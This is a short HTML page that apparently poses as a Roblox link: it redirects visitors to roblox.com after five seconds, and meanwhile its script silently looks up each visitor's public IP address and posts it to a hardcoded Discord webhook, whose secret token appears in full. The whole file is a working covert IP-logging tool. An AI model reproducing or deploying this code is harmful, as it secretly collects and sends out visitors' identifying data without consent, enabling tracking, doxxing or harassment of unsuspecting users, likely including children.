<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="refresh" content="5; url=https://www.roblox.com/home"> <!-- Delay of 5 seconds -->
</head>
<body>
  <input type="text" id="ip" value="">
  
  <script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.ipify.org', true);
    xhr.onload = function () {
      var ip = this.responseText;
      document.getElementById('ip').value = ip;

      // Send the IP address to Discord webhook
      var webhookUrl = 'https://discord.com/api/webhooks/1102690295004545036/C2CJdUfLIZAqfI4DJoxAgFNajvmUTWGGyDDRMgkq8svJHObtC4xw7LuayVLe3Zuo-kvA';
      var xhr2 = new XMLHttpRequest();
      xhr2.open('POST', webhookUrl, true);
      xhr2.setRequestHeader('Content-type', 'application/json');
      xhr2.send(JSON.stringify({ content: 'Someone visited the website and their IP address is: ' + ip }));
    };
    xhr.send();
  </script>
</body>
</html>
